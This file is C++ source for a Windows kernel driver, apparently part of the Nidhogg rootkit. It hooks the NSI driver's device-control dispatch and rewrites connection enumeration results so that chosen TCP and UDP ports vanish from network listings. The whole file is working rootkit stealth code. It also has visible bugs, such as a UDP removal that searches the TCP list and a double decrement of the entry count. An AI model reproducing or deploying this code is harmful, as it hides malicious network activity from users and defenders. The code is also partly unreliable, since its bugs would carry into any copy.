#include "pch.h"
#include "NetworkHandler.h"

_IRQL_requires_max_(APC_LEVEL)
NetworkHandler::NetworkHandler() {
	callbackActivated = false;
	originalNsiDispatchAddress = NULL;

	if (!InitializeList(&hiddenTcpPorts))
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	if (!InitializeList(&hiddenUdpPorts)) {
		FreeVirtualMemory(hiddenTcpPorts.Items);
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
	}
}

_IRQL_requires_max_(APC_LEVEL)
NetworkHandler::~NetworkHandler() {
	ClearHiddenPortsList(PortType::All);
	FreeVirtualMemory(hiddenTcpPorts.Items);
	FreeVirtualMemory(hiddenUdpPorts.Items);
}

/*
* Description:
* InstallNsiHook is responsible to hook Nsi's device io control handler.
*
* Parameters:
* @remove [_In_ bool] -- Whether to install or remove the hook.
*
* Returns:
* @status [NTSTATUS]  -- Whether installed or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS NetworkHandler::InstallNsiHook(_In_ bool remove) {
	UNICODE_STRING driverName;
	PDRIVER_OBJECT driverObject = nullptr;
	NTSTATUS status = STATUS_SUCCESS;

	RtlInitUnicodeString(&driverName, NSI_DRIVER_NAME);
	status = ObReferenceObjectByName(&driverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, 
		reinterpret_cast<PVOID*>(&driverObject));

	if (!NT_SUCCESS(status))
		return status;
	LONG64* deviceControlAddress = reinterpret_cast<LONG64*>(&driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]);

	if (!remove) {
		originalNsiDispatchAddress = reinterpret_cast<PVOID>(InterlockedExchange64(deviceControlAddress,
			reinterpret_cast<LONG64>(HookedNsiDispatch)));
		callbackActivated = true;
	}
	else {
		InterlockedExchange64(deviceControlAddress, reinterpret_cast<LONG64>(originalNsiDispatchAddress));
		originalNsiDispatchAddress = nullptr;
		callbackActivated = false;
	}

	ObDereferenceObject(driverObject);
	return status;
}

/*
* Description:
* FindHiddenPort is responsible for searching if a port exists in the hidden ports list.
*
* Parameters:
* @port   [_In_ HiddenPort&] -- Port to find.
*
* Returns:
* @bool						 -- Whether found or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool NetworkHandler::FindHiddenPort(_In_ HiddenPort& port) const {
	auto finder = [](_In_ const HiddenPort* entry, _In_ HiddenPort& other) -> bool {
		return entry->Port == other.Port && entry->Remote == other.Remote;
	};

	switch (port.Type) {
	case PortType::TCP: {
		return FindListEntry<HiddenPorts, HiddenPort, HiddenPort&>(hiddenTcpPorts, port, finder);
		break;
	}
	case PortType::UDP: {
		return FindListEntry<HiddenPorts, HiddenPort, HiddenPort&>(hiddenUdpPorts, port, finder);
		break;
	}
	}
	return false;
}

/*
* Description:
* AddHiddenPort is responsible for adding a port to the hidden ports list.
*
* Parameters:
* @port   [_In_ HiddenPort&] -- Port to add.
*
* Returns:
* @bool						 -- Whether successfully added or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool NetworkHandler::AddHiddenPort(_In_ HiddenPort& port) {
	if (FindHiddenPort(port))
		return false;
	HiddenPort* newEntry = AllocateMemory<HiddenPort*>(sizeof(HiddenPort));

	if (!newEntry)
		return false;
	newEntry->Port = port.Port;
	newEntry->Type = port.Type;
	newEntry->Remote = port.Remote;

	switch (port.Type) {
		case PortType::TCP: {
			AddEntry<HiddenPorts, HiddenPort>(&hiddenTcpPorts, newEntry);
			break;
		}
		case PortType::UDP: {
			AddEntry<HiddenPorts, HiddenPort>(&hiddenUdpPorts, newEntry);
			break;
		}
	}
	return true;
}

/*
* Description:
* RemoveHiddenPort is responsible for removing a port from the hidden ports list.
*
* Parameters:
* @port   [_In_ HiddenPort&] -- Port to remove.
*
* Returns:
* @bool						 -- Whether successfully removed or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool NetworkHandler::RemoveHiddenPort(_In_ HiddenPort& port) {
	auto finder = [](_In_ const HiddenPort* entry, _In_ HiddenPort& other) -> bool {
		return entry->Port == other.Port && entry->Remote == other.Remote;
	};

	switch (port.Type) {
	case PortType::TCP: {
		HiddenPort* entry = FindListEntry<HiddenPorts, HiddenPort, HiddenPort&>(hiddenTcpPorts, port, finder);
		return RemoveListEntry<HiddenPorts, HiddenPort>(&hiddenTcpPorts, entry);
	}

	case PortType::UDP: {
		HiddenPort* entry = FindListEntry<HiddenPorts, HiddenPort, HiddenPort&>(hiddenTcpPorts, port, finder);
		return RemoveListEntry<HiddenPorts, HiddenPort>(&hiddenUdpPorts, entry);
	}
	default:
		return false;
	}
}

/*
* Description:
* ClearHiddenPortsList is responsible for clearing the hidden ports list.
*
* Parameters:
* @portType   [_In_ PortType] -- Type of ports to clear (TCP, UDP or All).
*
* Returns:
* There is no return value.
*/
_IRQL_requires_max_(APC_LEVEL)
void NetworkHandler::ClearHiddenPortsList(_In_ PortType portType) {
	switch (portType) {
	case PortType::TCP:
		ClearList<HiddenPorts, HiddenPort>(&hiddenTcpPorts);
		break;
	case PortType::UDP:
		ClearList<HiddenPorts, HiddenPort>(&hiddenUdpPorts);
		break;
	case PortType::All:
		ClearList<HiddenPorts, HiddenPort>(&hiddenTcpPorts);
		ClearList<HiddenPorts, HiddenPort>(&hiddenUdpPorts);
		break;
	}
}

/*
* Description:
* ListHiddenPorts is responsible for getting the hidden ports.
*
* Parameters:
* @outputHiddenPorts   [OutputHiddenPorts*] -- List of hidden ports to fill.
*
* Returns:
* There is no return value.
*/
_IRQL_requires_max_(APC_LEVEL)
bool NetworkHandler::ListHiddenPorts(_Inout_ IoctlHiddenPorts* hiddenPorts) const {
	PLIST_ENTRY currentEntry = nullptr;
	SIZE_T count = 0;
	HiddenPorts hiddenPortsList;

	if (!hiddenPorts)
		return false;

	switch (hiddenPorts->Type) {
		case PortType::TCP:
			hiddenPortsList = hiddenTcpPorts;
			break;
		case PortType::UDP:
			hiddenPortsList = hiddenUdpPorts;
			break;
		default:
			return false;
	}
	AutoLock locker(hiddenPortsList.Lock);

	if (hiddenPortsList.Count == 0) {
		hiddenPorts->Count = 0;
		return true;
	}
	if (hiddenPorts->Count != hiddenPortsList.Count) {
		hiddenPorts->Count = hiddenPortsList.Count;
		return true;
	}
	MemoryGuard guard(hiddenPorts->Ports, sizeof(ULONG) * hiddenPortsList.Count, UserMode);

	if (!guard.IsValid())
		return false;

	currentEntry = hiddenPortsList.Items;

	while (currentEntry->Flink != hiddenPortsList.Items && count < hiddenPortsList.Count) {
		currentEntry = currentEntry->Flink;
		HiddenPort* item = CONTAINING_RECORD(currentEntry, HiddenPort, Entry);

		if (item) {
			hiddenPorts->Ports[count].Port = item->Port;
			hiddenPorts->Ports[count].Remote = item->Remote;
		}
		count++;
		currentEntry = currentEntry->Flink;
	}
	return true;
}

/*
* Description:
* HidePort is responsible to hide a port from the Nsi entries.
* 
* Parameters:
* @entries		  [_Inout_ PVOID]			   -- Pointer to the entries.
* @nsiParameter	  [_In_ PNSI_PARAM]			   -- Pointer to the Nsi parameters.
* @statusEntries  [_Inout_ PNSI_STATUS_ENTRY]  -- Pointer to the status entries.
* @processEntries [_Inout_ PNSI_PROCESS_ENTRY] -- Pointer to the process entries.
* @index		  [_In_ SIZE_T]				   -- Index of the entry to hide.
* 
* Returns:
* @status		  [NTSTATUS]				   -- Whether successfully hidden or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS HidePort(_Inout_ PVOID entries, _In_ PNSI_PARAM nsiParameter, _Inout_ PNSI_STATUS_ENTRY statusEntries,
	_Inout_ PNSI_PROCESS_ENTRY processEntries, _In_ SIZE_T index) {
	NTSTATUS status = STATUS_SUCCESS;
	PUCHAR pEntries = static_cast<PUCHAR>(entries);

	if (index + 1 >= nsiParameter->Count) {
		__try {
			RtlSecureZeroMemory(pEntries + (index * nsiParameter->EntrySize), nsiParameter->EntrySize);

			if (statusEntries)
				RtlSecureZeroMemory(&statusEntries[index], sizeof(NSI_STATUS_ENTRY));

			if (processEntries)
				RtlSecureZeroMemory(&processEntries[index], nsiParameter->ProcessEntrySize);
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			return GetExceptionCode();
		}
	}

	else {
		SIZE_T bytesToMove = (nsiParameter->Count - (index + 1)) * nsiParameter->EntrySize;
		status = MmCopyVirtualMemory(
			PsGetCurrentProcess(),
			pEntries + (index + 1) * nsiParameter->EntrySize,
			PsGetCurrentProcess(),
			pEntries + index * nsiParameter->EntrySize,
			bytesToMove,
			KernelMode,
			nullptr);

		if (!NT_SUCCESS(status))
			return status;

		if (statusEntries) {
			SIZE_T bytesToMoveStatus = (nsiParameter->Count - (index + 1)) * sizeof(NSI_STATUS_ENTRY);
			status = MmCopyVirtualMemory(
				PsGetCurrentProcess(),
				&statusEntries[index + 1],
				PsGetCurrentProcess(),
				&statusEntries[index],
				bytesToMoveStatus,
				KernelMode,
				nullptr);

			if (!NT_SUCCESS(status))
				return status;
		}

		if (processEntries) {
			SIZE_T bytesToMoveProcess = (nsiParameter->Count - (index + 1)) * nsiParameter->ProcessEntrySize;
			status = MmCopyVirtualMemory(
				PsGetCurrentProcess(),
				&processEntries[index + 1],
				PsGetCurrentProcess(),
				&processEntries[index],
				bytesToMoveProcess,
				KernelMode,
				nullptr);
			if (!NT_SUCCESS(status))
				return status;
		}
	}
	nsiParameter->Count--;
	return status;
}

/*
* Description:
* NsiIrpComplete is responsible to handle IRP completion for the hooked Nsi dispatch function.
*
* Parameters:
* @deviceObject [_Inout_ PDEVICE_OBJECT] -- Driver device object.
* @irp			[_Inout_ PIRP]			 -- Pointer to the Irp.
* @irpContext	[_Inout_ PVOID]			 -- Irp context.
*
* Returns:
* @status		[NTSTATUS]				 -- Depends on the status of the previous function.
*/
_IRQL_requires_max_(APC_LEVEL)
_IRQL_requires_same_
NTSTATUS NsiIrpComplete(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp, _Inout_ PVOID irpContext) {
	SIZE_T entriesHidden = 0;
	HookedCompletionRoutine* context = static_cast<HookedCompletionRoutine*>(irpContext);

	if (NT_SUCCESS(irp->IoStatus.Status)) {
		do {
			PNSI_PARAM nsiParameter = static_cast<PNSI_PARAM>(irp->UserBuffer);

			if (!nsiParameter || (!VALID_KERNELMODE_MEMORY(reinterpret_cast<ULONGLONG>(nsiParameter)) &&
				!NT_SUCCESS(ProbeAddress(nsiParameter, sizeof(PNSI_PARAM), sizeof(PNSI_PARAM))))) [[ unlikely ]] {
				break;
			}

			if (nsiParameter->Entries && nsiParameter->EntrySize > 0) {
				HiddenPort hiddenPort{};
				PNSI_TABLE_TCP_ENTRY tcpEntries = static_cast<PNSI_TABLE_TCP_ENTRY>(nsiParameter->Entries);
				PNSI_UDP_ENTRY udpEntries = static_cast<PNSI_UDP_ENTRY>(nsiParameter->Entries);
				PNSI_STATUS_ENTRY statusEntries = static_cast<PNSI_STATUS_ENTRY>(nsiParameter->StatusEntries);
				PNSI_PROCESS_ENTRY processEntries = static_cast<PNSI_PROCESS_ENTRY>(nsiParameter->ProcessEntries);

				for (SIZE_T i = 0; i < nsiParameter->Count; i++) {
					if (nsiParameter->Type == COMUNICATION_TYPE::TCP) {
						// Edge case of somehow the entries list is empty or invalid address of entry.
						if (!tcpEntries)
							continue;

						if (!ProbeAddress(&tcpEntries[i], sizeof(NSI_TABLE_TCP_ENTRY), sizeof(NSI_TABLE_TCP_ENTRY)))
							continue;

						__try {
							hiddenPort.Port = htohs(tcpEntries[i].Local.Port);
							hiddenPort.Type = PortType::TCP;
							hiddenPort.Remote = false;

							if (NidhoggNetworkHandler->FindHiddenPort(hiddenPort)) {
								if (!NT_SUCCESS(HidePort(tcpEntries, nsiParameter, statusEntries, processEntries, i)))
									break;
								entriesHidden++;
							}

							hiddenPort.Port = htohs(tcpEntries[i].Remote.Port);
							hiddenPort.Type = PortType::TCP;
							hiddenPort.Remote = true;

							if (NidhoggNetworkHandler->FindHiddenPort(hiddenPort)) {
								if (!NT_SUCCESS(HidePort(tcpEntries, nsiParameter, statusEntries, processEntries, i)))
									break;
								entriesHidden++;
							}
						}
						__except (EXCEPTION_EXECUTE_HANDLER) {}
					}
					else if (nsiParameter->Type == COMUNICATION_TYPE::UDP) {
						// Edge case of somehow the entries list is empty or invalid address of entry.
						if (!udpEntries)
							continue;

						if (!ProbeAddress(&udpEntries[i], sizeof(NSI_UDP_ENTRY), sizeof(NSI_UDP_ENTRY)))
							continue;

						__try {
							hiddenPort.Port = htohs(udpEntries[i].Port);
							hiddenPort.Type = PortType::UDP;

							if (NidhoggNetworkHandler->FindHiddenPort(hiddenPort)) {
								if (!NT_SUCCESS(HidePort(udpEntries, nsiParameter, statusEntries, processEntries, i)))
									break;
								entriesHidden++;
							}
						}
						__except (EXCEPTION_EXECUTE_HANDLER) { }
					}
				}

				nsiParameter->Count -= entriesHidden;
			}
		} while (false);
	}
	
	if (context->OriginalCompletionRoutine) {
		PIO_COMPLETION_ROUTINE originalRoutine = context->OriginalCompletionRoutine;
		PVOID originalContext = context->OriginalContext;

		FreeVirtualMemory(irpContext);
		return originalRoutine(deviceObject, irp, originalContext);
	}
	
	FreeVirtualMemory(irpContext);
	return STATUS_SUCCESS;
}

/*
* Description:
* HookedNsiDispatch is responsible to handle IOCTLs for Nsi.
*
* Parameters:
* @deviceObject [_Inout_ PDEVICE_OBJECT] -- Driver device object.
* @irp			[_Inout_ PIRP]			 -- Pointer to the Irp.
*
* Returns:
* @status		[NTSTATUS]				 -- Whether the operation was successful or not.
*/
_IRQL_requires_max_(DISPATCH_LEVEL)
_IRQL_requires_same_
NTSTATUS HookedNsiDispatch(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp) {
	auto stack = IoGetCurrentIrpStackLocation(irp);

	if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_NSI_ENUMERATE_OBJECTS_ALL_PARAMETERS) {
		HookedCompletionRoutine* context = AllocateMemory<HookedCompletionRoutine*>(sizeof(HookedCompletionRoutine), false);

		if (context) {
			context->OriginalCompletionRoutine = stack->CompletionRoutine;
			context->OriginalContext = stack->Context;
			stack->Context = context;
			stack->CompletionRoutine = NsiIrpComplete;
			stack->Control |= SL_INVOKE_ON_SUCCESS;
		}
	}

	return (static_cast<PDRIVER_DISPATCH>(NidhoggNetworkHandler->GetOriginalCallback()))(deviceObject, irp);
}